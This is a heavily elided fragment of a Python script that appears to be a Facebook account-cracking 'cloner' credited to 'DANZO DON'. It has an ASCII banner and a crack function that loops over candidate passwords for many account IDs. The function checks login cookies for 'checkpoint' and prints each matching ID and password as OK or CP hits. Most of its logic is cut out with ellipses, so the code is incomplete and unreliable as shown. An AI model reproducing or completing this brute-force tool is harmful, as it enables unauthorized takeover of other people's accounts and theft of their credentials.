...
\033[1;37m----------------------------------------------
 ...
 GITHUB     : 𝗦 𝗘 𝗖 𝗥 𝗘 𝗧
 FACEBOOK   : DANZO DON
 DECODE BY  : D A N Z O O
\033[1;37m----WELCOME TO C L O N E R S-""")
def banner():
	print(logo)
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r {P}[DANZO-DON]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r{P}{K} [MAMBA-CP] {idf} │ {pw} {P}')
				...
				print(f'\r{P}{H} [DANZO-OK] {idf} │ {pw} {P}')
	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r{P}{H} [MAMBA-OK] {idf} │ {pw} {P}')
